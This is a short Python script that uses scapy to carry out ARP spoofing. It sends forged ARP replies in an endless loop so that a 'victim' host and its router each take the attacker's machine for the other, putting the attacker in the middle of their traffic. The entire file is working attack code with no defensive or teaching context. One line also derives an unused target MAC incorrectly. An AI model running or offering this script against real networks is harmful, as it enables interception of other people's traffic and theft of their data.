import scapy.all as scapy
import time

def spoof(target_ip, spoof_ip):
    target_mac = scapy.ARP(pdst=target_ip).hwsrc
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    scapy.send(packet, verbose=False)

target_ip = "10.0.2.5"  # Victim's IP
spoof_ip = "10.0.2.1"   # IP to impersonate (e.g., router)

while True:
    spoof(target_ip, spoof_ip)
    spoof(spoof_ip, target_ip)
    print(f"[*] Sent spoofed ARP packets to {target_ip} as {spoof_ip}")
    time.sleep(2)  # Adjust delay as needed
